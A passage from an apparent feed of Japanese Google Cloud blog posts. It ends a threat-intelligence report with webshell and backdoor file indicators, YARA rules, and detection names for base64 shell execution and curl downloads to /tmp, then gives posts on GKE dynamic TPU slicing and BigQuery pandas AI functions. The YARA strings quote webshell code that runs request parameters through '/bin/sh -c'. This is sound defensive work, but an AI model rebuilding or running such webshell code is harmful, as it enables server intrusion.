#5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">ファイル名</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">説明</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ActiveSer.jsp</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">SLIMSAVAGE ウェブシェル</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">u.jsp</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">CAGEMATCH ステージング ウェブシェル</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/tmp/123</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">BONESAW ユーティリティ</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/tmp/sss</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">SAWSNAKE ユーティリティ</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/tmp/dbr</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">BEARBONES バックドア</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/usr/bin/vmtoolscs</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LAZYBONES バックドア</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">表 3: ファイル指標</span></p></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">検知（Detections）</strong></h3>\n<h4><span style=\"vertical-align: baseline;\">YARA ルール</span></h4>\n<pre class=\"language-markup\"><code>rule G_Hunting_Webshell_SLIMSAVAGE_1 {\n      meta:\n        author = \"Google Threat Intelligence Group\"\n      strings:\n        $s1 = \"if(\\\"123\\\".equals(request.getParameter(\\\"pwd\\\")))\" ascii wide\n        $s2 = \"new ProcessBuilder(\\\"/bin/sh\\\",\\\"-c\\\",request.getParameter(\\\"i\\\"))\" ascii wide\n        $s3 = \"InputStream a = p.getInputStream(), b = p.getErrorStream();\" ascii wide\n        $s4 = \"while((c=a.read(d))!=-1){out.print(new String(d,0,c));}\" ascii wide\n        $s5 = \"catch(Exception e){out.print(\\\"ERR:\\\"+e);}\" ascii wide\n    \n      condition:\n        all of ($s*)\n    }</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>rule G_Hunting_Webshell_CAGEMATCH_1 {\n      meta:\n        author = \"Google Threat Intelligence Group\"\n      strings:\n        $s1 = \"request.getContentType().split(\\\"boundary=\\\")\" ascii wide\n        $s2 = \"String s=new String(d,\\\"ISO-8859-1\\\");int fi=s.indexOf(\\\"filename=\\\\\\\"\\\");\" ascii wide\n        $s3 = \"String fname=new File(s.substring(fs,fe)).getName();\" ascii wide\n        $s4 = \"int so=s.substring(0,ds).getBytes(\\\"ISO-8859-1\\\").length;\" ascii wide\n        $s5 = \"File f=new File(\\\"/tmp\\\");f.mkdirs();File fout=new File(f,fname);\" ascii wide\n    \n      condition:\n        4 of ($s*)\n    }</code></pre>\n<p> </p>\n<pre class=\"language-markup\"><code>rule G_Hunting_Utility_SAWSNAKE_2 {\n        meta:\n            author = \"Google Threat Intelligence Group\"\n        strings:\n            $src1 = \"saml_login/mdb.go\" ascii\n            $src2 = \"saml_login/saml.go\" ascii\n            $src3 = \"saml_login/c14n.go\" ascii\n            $s1 = \"[+] Successfully obtained Administrator cookies for %s!\" ascii\n            $s2 = \"[*] Successfully extracted trusted certificate 1\" ascii\n            $s3 = \"[*] Successfully extracted the IdP certificate\" ascii\n            $s4 = \"https://%s/ui/saml/websso/sso\" ascii\n            $s5 = \"effective SSO host for the exchange: %q\" ascii\n            $s6 = \"assertion canonicalized for digest: %d bytes, sha256=%s\" ascii\n        condition:\n            uint32(0) == 0x464c457f and (2 of ($src*) or 4 of ($s*))\n    }</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>rule G_Hunting_Utility_BONESAW_2 {\n  meta:\nauthor = \"Google Threat Intelligence Group\" \n  strings:\n    $s_mdb_path = \"/storage/db/vmware-vmdir/data.mdb\" ascii\n    $s_srp_prime_n = \"AC6BDB41324A9A9BF166DE5E1389582FAF72B6651987EE07FC3192943DB56050\" ascii\n    $s_uuid_dbcp = \"72c780fe-af6b-42ba-9b02-f61f4ccc98ed\" ascii nocase\n    $c_uuid_dbcp = { fe 80 c7 72 6b af ba 42 9b 02 f6 1f 4c cc 98 ed }\n    $s_uuid_srp_verf = \"c7e94609-6ab0-4767-8e92-b6485bff1649\" ascii nocase\n    $c_uuid_srp_verf = { 09 46 e9 c7 b0 6a 67 47 8e 92 b6 48 5b ff 16 49 }\n\n  condition:\n    uint32(0) == 0x464C457F\n    and $s_mdb_path\n    and $s_srp_prime_n\n    and ($s_uuid_dbcp or $c_uuid_dbcp)\n    and ($s_uuid_srp_verf or $c_uuid_srp_verf)\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>rule G_Hunting_Backdoor_BEARBONES_1 {\n      meta:\n        author = \"Google Threat Intelligence Group\"    \n      strings:\n        $c_sha256_len = { BA 0E 00 00 00 4C 89 E7 48 89 EE }\n        $s_banner = \"SSH-2.0-pulsesecure_\" ascii\n        $s_rsa_key = \"/tmp/rsa_host_key\" ascii\n        $s_ecdsa_key = \"/tmp/ecdsa_host_key\" ascii\n        $s_dss_key = \"/tmp/dss_host_key\" ascii\n    \n      condition:\n        uint32(0) == 0x464C457F\n        and ($c_sha256_len or $s_banner)\n        and 2 of ($s_*)\n    }</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>rule G_Hunting_Backdoor_LAZYBONES_1 {\n    meta:\n        author = \"Google Threat Intelligence Group\"\n    strings:\n        $fn1 = \"main.AesCtfCrypt_fromconf\" ascii wide\n        $fn2 = \"main.AesCtfDecrypt_fromconf\" ascii wide\n        $fn3 = \"main.uploadSlackFile\" ascii wide\n        $fn4 = \"main.getLastMessage\" ascii wide\n        $fn5 = \"main.exec_my\" ascii wide\n        $api1 = \"https://slack.com/api/files.getUploadURLExternal\" ascii wide\n        $api2 = \"https://slack.com/api/files.completeUploadExternal\" ascii wide\n        $api3 = \"https://slack.com/api/conversations.history\" ascii wide\n        $str1 = \"ok,current sleep is:\" ascii wide\n        $str2 = \"get but not function\" ascii wide\n        $str3 = \"readfile fail:\" ascii wide\n    condition:\n        uint32(0) == 0x464c457f and\n        (\n            3 of ($fn*) or\n            (2 of ($api*) and 2 of ($str*))\n        )\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Google Security Operations（SecOps）</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Google SecOps のお客様は、Mandiant Frontline Threats、Mandiant Intel Emerging Threats、および Mandiant Hunt Endpoint Identification Rules のルール パックのもとで、これらの広範なカテゴリ ルールなどにアクセスできます。本ブログ記事で説明されている活動は、Google SecOps では以下のルール名で検出されます:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">VMware vCenter VAMI API SSH Enablement</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Base64 Encoded Shell Command Execution</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Linux Web Server Process Echo Base64 Encoded String</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Curl Network Connection to Staging Directory</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Curl Download to tmp</span></p>\n</li>\n</ul>\n<h1><strong style=\"vertical-align: baseline;\">謝辞</strong></h1>\n<p><span style=\"vertical-align: baseline;\">本分析は Stuart Carrera 氏および FLARE チームの協力なしには実現できませんでした。また、本脅威に対する取り組みにおける Broadcom の協力に感謝いたします。</span></p></div>"
  "620262adebe1b20d0fba7ffbcb4f6adc":
    "id": "620262adebe1b20d0fba7ffbcb4f6adc"
    "title": "一般提供開始: TPU のレジリエンスと効率性を高める GKE の動的スライス"
    "link": "https://cloud.google.com/blog/ja/products/containers-kubernetes/gke-dynamic-slicing-on-tpus/"
    "published": "2026-11-20 11:00:00"
    "fetched": "2026-11-20 19:55:50"
    "summary": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">※この投稿は米国時間 2026 年 11 月 10 日に、Google Cloud blog に</span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/gke-dynamic-slicing-on-tpus?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">投稿</span></a><span style=\"vertical-align: baseline;\">されたものの抄訳です。</span></p>\n<p><span style=\"vertical-align: baseline;\">TPU と Google Kubernetes Engine（GKE）で大規模な AI ワークロードを実行するには、モデルの変化に即座に適応できるインフラストラクチャが必要です。GKE で一般提供されている動的スライスは、論理 TPU スライスの構成を、物理ノードプールのプロビジョニングから分離します。</span></p>\n<p><span style=\"vertical-align: baseline;\">TPU スライスごとに静的なノードプールを作成する場合と比較して、動的スライスでは AI ワークロードの起動時間が最大 </span><strong style=\"vertical-align: baseline;\">5 倍</strong><span style=\"vertical-align: baseline;\">、ワークロードの復旧時間が </span><strong style=\"vertical-align: baseline;\">4.5 倍</strong><span style=\"vertical-align: baseline;\">短縮され、大規模環境における TPU のグッドプット、効率性、ワークロードのレジリエンスが最大化されます。</span></p>\n<h4><strong style=\"vertical-align: baseline;\">1 つのワークロード、1 つのノードプールを超える</strong></h4>\n<p><span style=\"vertical-align: baseline;\">以前は、GKE Standard で TPU 容量を管理するには、TPU スライス トポロジごとに固定されたノードプールを個別に用意する必要がありました。そのため、起動時間が長くなり、複雑さが増しただけでなく、マルチホスト ノードプールで複数の AI ワークロードをホストできませんでした。ワークロードの要件が変化すると、ノードプールを手動で削除して再作成する必要がありました。さらに、この密結合により、単一のハードウェア障害がスライス全体をクラッシュさせるという、大規模な障害ドメインが発生し、再プロビジョニング中の復旧が遅延しました。</span></p>\n<p><span style=\"vertical-align: baseline;\">こうした課題を克服するため、Google は GKE 動的スライスを構築しました。これは、物理ハードウェアのプロビジョニングを論理スライス構成から切り離し、TPU 光回路スイッチ（OCS）テクノロジーを使用して TPU キューブを動的に結合し、さまざまな大規模なスライス トポロジを形成（スーパースライス）したり、TPU キューブをより小さなスライスに分割して、ノードプール内で複数のワークロードを実行（サブスライス）したりするものです。動的スライスを使用すると、ワークロードは静的ノードプールを削除して再作成しなくても、カスタム TPU スライス トポロジをオンデマンドで構築できるようになり、ジョブの起動レイテンシの短縮、ハードウェア障害の影響範囲の限定、ワークロードの復旧の加速、フリートの稼働率と効率の向上が実現します。</span></p>\n<p><span style=\"vertical-align: baseline;\">動的スライスは、プラットフォーム チームに以下のような重要なメリットをもたらします。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">ダウンタイム ゼロのトポロジのアジリティ:</strong><span style=\"vertical-align: baseline;\"> 柔軟性のない「削除して作成する」ノードプール サイクルを完全に排除し、TPU キューブ（16 台の VM から成るノードプール）を動的に結合して、大規模な TPU スライスを形成したり、AI ワークロードの送信時にその場で小規模なスライスを切り分けたりすることができます。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">ジョブの起動が最大 5 倍高速化:</strong><span style=\"vertical-align: baseline;\"> 時間のかかる新規ノードプールのデプロイを待つ代わりに、事前プロビジョニング済みの TPU ノードプールから論理スライス トポロジを即座に構築することで、ジョブの起動時間を最大 5 分の 1 に短縮します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">フリートの稼働率の向上:</strong><span style=\"vertical-align: baseline;\"> ノードプール内で小規模なワークロードをマルチテナント パッキングすることで、リソース効率を向上させ、アイドル状態の容量をなくします。さらに、部分的に正常なノードプールをプロビジョニングすることも可能です。これにより、通常なら利用できない正常なホストを利用できるようになります。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">最大 4.5 倍の高速な復旧とフォールト トレランス:</strong><span style=\"vertical-align: baseline;\"> 大規模なスライスの障害部分を TPU キューブ（16 台の VM から成る 4x4x4 のスライス トポロジ）に分離し、異常のあるキューブを 1～2 分で入れ替えることで、復旧を高速化します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">可視性と制御性の強化:</strong><span style=\"vertical-align: baseline;\"> 各キューブ内で構成可能な TPU パーティション（スライス）に関する包括的な分析情報を提供し、リアルタイムでの健全性と使用状況の指標を網羅することで、プロアクティブで最適化されたワークロード スケジューリングを促進します。</span></p>\n</li>\n</ul>\n<h4><strong style=\"vertical-align: baseline;\">動的スライス アーキテクチャ</strong></h4>\n<p><span style=\"vertical-align: baseline;\">GKE の動的スライスには、単一の TPU キューブのサイズを超える大規模な TPU スライスを作成する「スーパースライス」と、単一のキューブからより小規模で独立したスライスをプロビジョニングする「サブスライス」という、2 つの形式があります。</span></p>\n<p><span style=\"vertical-align: baseline;\">動的スーパースライス</span></p>\n<p><span style=\"vertical-align: baseline;\">GKE の動的スーパースライスは、TPU 光回路スイッチ（OCS）テクノロジーを利用して、ワークロード スケジューリング時に TPU キューブ（4x4x4 のスライス トポロジで構成された 16 台の VM で構成）を動的に接続します。OCS ネットワーク構成を動的に変更することで、Kubernetes のワークロード マニフェストに記載されているワークロード スライスの要件に合わせて、より大規模なスライス トポロジが作成され、運用効率が大幅に向上します。</span></p>\n<p><span style=\"vertical-align: baseline;\">基本的にスーパースライスは、利用可能なすべての TPU 容量を、16 VM（4x4x4）の TPU キューブで構成される均一なノードプールにあらかじめ変換しておくことを前提としています。Kubernetes ワークロードの YAML ファイルで TPU スライス トポロジが指定されると、GKE スケジューラ（またはカスタム スケジューラ）がそのリクエストを識別し、スライスの作成を開始します。このプロセスでは、TPU の</span><a href=\"http://cloud.google.com/blog/topics/systems/the-evolution-of-googles-jupiter-data-center-network?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">光回路スイッチ</span></a><span style=\"vertical-align: baseline;\">を使用して複数の 4x4x4 キューブを結合し、ターゲットのスライス トポロジを動的に構築して、新しく作成されたスーパースライスにワークロードを直接スケジュールします。</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1. SUperSliceVisualizer_compressed\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/1._SUperSliceVisualizer_compressed.gif\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>4 個の Ironwood キューブ（GKE ノードプールとしてもプロビジョニングされている）を使用して、4x4x16 のスーパースライス（64 台の Ironwood VM と合計 256 個のチップで構成）を形成する方法を示した図。実行時には、この 4 個のキューブ内の全 TPU チップにわたる TPU ネットワークを結合することで、スライスが動的に作成されます。</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">動的サブスライス</strong></p>\n<p><span style=\"vertical-align: baseline;\">動的サブスライスは、事前にプロビジョニングされた単一の TPU キューブ（16 台の VM から成るノードプール）を、オンデマンドでより小規模な独立したサブスライスに分割します。均一な TPU キューブの単一プールを管理し、オンデマンドで分割できます。このアプローチにより、スライス トポロジの要件がまったく異なる複数のジョブを、同じ物理 TPU キューブ内で完全に分離して同時に実行できます。これにより、全体的なリソース使用率が向上し、キューブの一部に異常がある場合でも、正常なパーティション上でワークロードを復旧して実行できます。</span></p>\n<p><span style=\"vertical-align: baseline;\">ワークロードがスケジュールされると、サブスライスは、受け取った Kubernetes マニフェストから、そのワークロードに固有のスライス トポロジ要件を動的に解析します。次に、キューブ内の正常なパーティションを特定し、高速チップ間相互接続（ICI）ネットワークを有効にしてサブスライスを形成し、新しく作成されたスライスにワークロードをデプロイします。ワークロードが完了すると、スケジューラはスライスを自動的に分解（「解体」）し、パーティションを共有プールに戻します。これにより、GKE ノードプールを再作成しなくても、将来のワークロードですぐに利用できるようになります。</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2. dynamic_sub_slicing_visualization\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/2._dynamic_sub_slicing_visualization.gif\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>GKE のサブスライスが、16 ホストの TPU キューブをより小規模な独立したスライス（例: 16 チップの 2x2x4 から 2x2x2 へ）に動的に分割し、TPU リソースを最適に利用する方法を示した図。</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">お客様のユースケース</strong></p>\n<p><span style=\"vertical-align: baseline;\">動的スライスを活用すると、巨大な TPU スライス トポロジを形成し、大規模なトレーニングに対応できます。8,000 チップの大規模な単一スライスから、数千チップのマルチスライス、単一ホストの 4 チップ構成に至るまで、さまざまな構成が可能です。これにより、同じ環境内で性質の異なる多種多様な AI ワークロードをサポートできます。最大規模のワークロードの要求に対応できるよう設計された</span><strong style=\"vertical-align: baseline;\">動的スライス</strong><span style=\"vertical-align: baseline;\">は、数千のアクセラレータにわたって実行される AI ワークロードに高いレジリエンスと運用効率をもたらします。</span><strong style=\"vertical-align: baseline;\">サブスライス</strong><span style=\"vertical-align: baseline;\">は、小規模なデプロイから大規模なデプロイまで、推論ワークロードを効率的にスケールできる汎用性を備えています。</span></p>\n<p><strong style=\"vertical-align: baseline;\">GKE 向け動的スライス スケジューラ</strong></p>\n<p><span style=\"vertical-align: baseline;\">GKE には、動的スライスに最適化され、そのままデプロイできるスケジューラが用意されています。また、独自のカスタム スケジューラを使用してワークロードの配置を管理することもできます。この柔軟性により、プロアクティブな稼働状況モニタリングに基づく、インテリジェントなワークロード スケジューリングが可能になります。詳しくは、</span><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/concepts/dynamic-slicing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ドキュメント</span></a><span style=\"vertical-align: baseline;\">をご覧ください。</span></p>\n<h4><strong style=\"vertical-align: baseline;\">ご利用にあたって</strong></h4>\n<p><strong style=\"vertical-align: baseline;\">ノードプールの事前プロビジョニング</strong></p>\n<p><span style=\"vertical-align: baseline;\">まず、1 回限りの作業として、TPU 容量をそれぞれ 16 台の VM から成るノードプールに事前プロビジョニング（TPU キューブまたはサブブロックにマッピング）する必要があります。このベースライン変換により、これらのユニットをオンデマンドでカスタム スライス トポロジに動的につなぎ合わせることができます。</span></p>\n<p><span style=\"vertical-align: baseline;\">動的スライスでは、増分プロビジョニング ノードプールと呼ばれる新しいタイプのノードプールが導入されます。増分プロビジョニング ノードプールは、TPU スライス作成における従来の「オール オア ナッシング」アプローチに代わる、フォールト トレラントなモデルです。GKE は、4x4x4（16 台の VM）スライスの一部のホストに障害がある場合でも、利用可能なすべての正常なホストを使用してノードプールをプロビジョニングします。システムは継続的に状態を調整し、障害が発生していたホストが復旧すると、保留中のノードを自動的に追加します。</span></p>\n<p><span style=\"vertical-align: baseline;\">高速 ICI ネットワーク メッシュを動的に構成できるようになるため、この設定は動的サブスライスの前提条件となります。増分プロビジョニングを使用すると、全容量分のノードプールを一度に作成できるようになり、正常なノードでサブスライスを有効にすることで、運用上のトイルを減らし、TPU の稼働率を最大化できます。</span></p>\n<p><strong style=\"vertical-align: baseline;\">動的スライスにおけるワークロード スケジューリング</strong></p>\n<p><span style=\"vertical-align: baseline;\">GKE クラスタでスライス コントローラを有効にし、GKE スケジューラを構成した後は、シンプルなワークロード アノテーションを使用して、ワークロードに動的スライスが必要であることを指定できます。</span></p>\n<p><span style=\"vertical-align: baseline;\">これらのアノテーションが検出されると、スケジューラは自動的に GKE スライス コントローラを起動し、実行時に動的スライスを形成するためのスライス </span><a href=\"https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">カスタム リソース</span></a><span style=\"vertical-align: baseline;\">（CR）を作成します。スライスが形成されると、ワークロードはその動的スライスにスケジュールされます。例については、</span><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/how-to/use-gke-dynamic-slicing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ドキュメント</span></a><span style=\"vertical-align: baseline;\">をご覧ください。</span></p>\n<h4><strong style=\"vertical-align: baseline;\">修復</strong></h4>\n<p><span style=\"vertical-align: baseline;\">ホストやネットワークの障害によってワークロードが中断した場合、GKE スケジューラは、以下のような対象を絞った復旧戦略によってレジリエンスと継続的な運用を維持します。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">スーパースライス（1 個の TPU キューブより大規模なスライス）: </strong><span style=\"vertical-align: baseline;\">ハードウェア障害は、より小規模な単位である TPU「キューブ」に分離されるため、スケジューラは、正常でないキューブを削除し、正常なキューブをすべて選択することで、スライスを迅速に再形成できます。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">サブスライス: </strong><span style=\"vertical-align: baseline;\">障害のあるインフラストラクチャ上のスライスは、利用可能な正常なパーティションを使用して動的に再形成されます。</span></p>\n</li>\n</ul>\n<h4><strong style=\"vertical-align: baseline;\">次のステップ</strong></h4>\n<p><span style=\"vertical-align: baseline;\">動的スライス（スーパースライスとサブスライス）は TPU で利用可能であり、TPU が利用可能なすべてのリージョンで提供されています。これは、予約モードの </span><a href=\"https://docs.cloud.google.com/tpu/docs/all-capacity-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TPU All Capacity</span></a><span style=\"vertical-align: baseline;\"> でのみサポートされています。動的スライスの実例については、</span><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/concepts/dynamic-slicing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ドキュメント</span></a><span style=\"vertical-align: baseline;\">をご覧ください。</span></p>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">- </strong><span style=\"font-style: italic; vertical-align: baseline;\">Google Cloud、プロダクト マネージャー、</span><strong style=\"font-style: italic; vertical-align: baseline;\">Kavitha Gowda</strong></p>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">- </strong><span style=\"font-style: italic; vertical-align: baseline;\">Google Cloud、Cloud AI、エンジニアリング マネージャー、</span><strong style=\"font-style: italic; vertical-align: baseline;\">Wenzhe Li</strong></p></div>"
  "0b04c6505db1b3fc9e2452e6a056e826":
    "id": "0b04c6505db1b3fc9e2452e6a056e826"
    "title": "新しい BigQuery アクセサーを使用した pandas でのゼロショット予測"
    "link": "https://cloud.google.com/blog/ja/products/data-analytics/bigquery-ai-functions-in-pandas/"
    "published": "2026-11-20 10:00:00"
    "fetched": "2026-11-20 19:55:50"
    "summary": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">※この投稿は米国時間 2026 年 11 月 7 日に、Google Cloud blog に</span><a href=\"https://cloud.google.com/blog/products/data-analytics/bigquery-ai-functions-in-pandas?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">投稿</span></a><span style=\"vertical-align: baseline;\">されたものの抄訳です。</span></p>\n<p><span style=\"vertical-align: baseline;\">使い慣れた pandas DataFrame を離れることなく、予測や分類から高次元エンベディングの生成まで、高度な ML ワークフローを実行できる様子を想像してみてください。</span><a href=\"https://dataframes.bigquery.dev/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery DataFrames（BigFrames）</span></a><span style=\"vertical-align: baseline;\">の新しい </span><code style=\"vertical-align: baseline;\">.bigquery</code><span style=\"vertical-align: baseline;\"> アクセサーにより、その構想が現実となります。pandas 内から直接 BigQuery のエンタープライズ グレードの AI 関数をシームレスに呼び出し、クラウド インフラストラクチャ上でデータ サイエンスや ML パイプラインをスケールできます。</span></p>\n<p><span style=\"vertical-align: baseline;\">線形回帰を例に見てみましょう。従来、pandas で回帰分析を行いたい場合、次のようにデータをローカルに抽出し、手動で特徴量を選択したうえで、カスタムの scikit-learn モデルをトレーニングする必要がありました。</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;import pandas as pd\\r\\nfrom sklearn.linear_model import LinearRegression\\r\\nfrom sklearn.preprocessing import StandardScaler\\r\\nfrom sklearn.pipeline import make_pipeline\\r\\n\\r\\n# Load historical training data from a CSV\\r\\ntrain_df = pd.read_csv(&#x27;historical_data.csv&#x27;)\\r\\n\\r\\n# Separate features (X) and target (y)\\r\\nX_train = train_df[[&#x27;feature_1&#x27;, &#x27;feature_2&#x27;]]\\r\\ny_train = train_df[&#x27;target_metric&#x27;]\\r\\n\\r\\n# Build and train a modeling pipeline\\r\\n# The StandardScaler ensures features with different scales don&#x27;t bias the model\\r\\nmodel_pipeline = make_pipeline(StandardScaler(), LinearRegression())\\r\\nmodel_pipeline.fit(X_train, y_train)\\r\\n\\r\\n# Load new data for inference from another CSV\\r\\nnew_data_df = pd.read_csv(&#x27;new_data.csv&#x27;)\\r\\nX_new = new_data_df[[&#x27;feature_1&#x27;, &#x27;feature_2&#x27;]]\\r\\n\\r\\n# Make predictions \\r\\n# (The pipeline automatically scales the new data before predicting)\\r\\nnew_data_df[&#x27;predictions&#x27;] = model_pipeline.predict(X_new)\\r\\n\\r\\nprint(new_data_df.head())&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe577318590&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><code style=\"vertical-align: baseline;\">.bigquery</code><span style=\"vertical-align: baseline;\"> アクセサーを使用すると、ローカルでのトレーニング プロセスを完全にスキップし、BigQuery 内のデータに対して強力な </span><code style=\"vertical-align: baseline;\">ai.predict()</code><span style=\"vertical-align: baseline;\"> を直接活用できます。</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;import pandas as pd\\r\\nimport bigframes.pandas as bpd  # Enables bigquery accessor\\r\\n\\r\\n# Set a GCP project to use AI functions.\\r\\nbpd.options.bigquery.project = &#x27;my-project&#x27; \\r\\n\\r\\ntrain_df = pd.read_csv(&#x27;historical_data.csv&#x27;)\\r\\nnew_data_df = pd.read_csv(&#x27;new_data.csv&#x27;)\\r\\n\\r\\n# Make predictions with TabFM\\r\\npredictions = train_df.bigquery.ai.predict(new_data_df, label_col=&#x27;target_metric&#x27;)\\r\\nprint(predictions)&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe577227250&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">ご覧のとおり、</span><code style=\"vertical-align: baseline;\">ai.predict()</code><span style=\"vertical-align: baseline;\"> を使えばわずか 1 回の関数呼び出しで 2 つの pandas DataFrame に対して直接回帰タスクを実行できるため、ML プロセス全体が大幅に簡素化されます。</span></p>\n<h3><strong style=\"vertical-align: baseline;\">BigQuery アクセサーの仕組み</strong></h3>\n<p><span style=\"vertical-align: baseline;\">内部処理として、</span><code style=\"vertical-align: baseline;\">.bigquery</code><span style=\"vertical-align: baseline;\"> アクセサーは </span><a href=\"https://dataframes.bigquery.dev/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery DataFrames</span></a><span style=\"vertical-align: baseline;\"> 